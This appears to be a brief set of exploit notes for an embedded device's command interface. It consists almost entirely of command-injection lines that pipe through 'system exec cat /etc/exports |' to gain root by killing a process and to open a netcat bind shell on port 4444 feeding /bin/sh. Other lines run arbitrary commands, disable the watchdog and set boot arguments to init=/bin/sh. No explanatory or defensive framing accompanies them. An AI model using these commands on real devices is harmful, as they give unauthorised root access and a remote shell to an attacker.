
# become root for a few seconds
system exec cat /etc/exports | killall Atsmain

# pipe bytes received on a TCP socket to the bourne interpreter
system exec cat /etc/exports | nc -l 4444 | /bin/sh

# exec arbitrary commands
system exec cat /etc/exports | ps aux
system exec cat /etc/exports | find / -iname Atsmain
system exec cat /etc/exports | /bin/sh /etc/rc.d/rcS.runtime stop
system exec cat /etc/exports | echo "V" > /dev/watchdog

# modify kernel params
setenv setbootargs setenv bootargs root=$rootdev rw console=$console,$baudrate $othbootargs reboot=cold,hard emergency init=/bin/sh
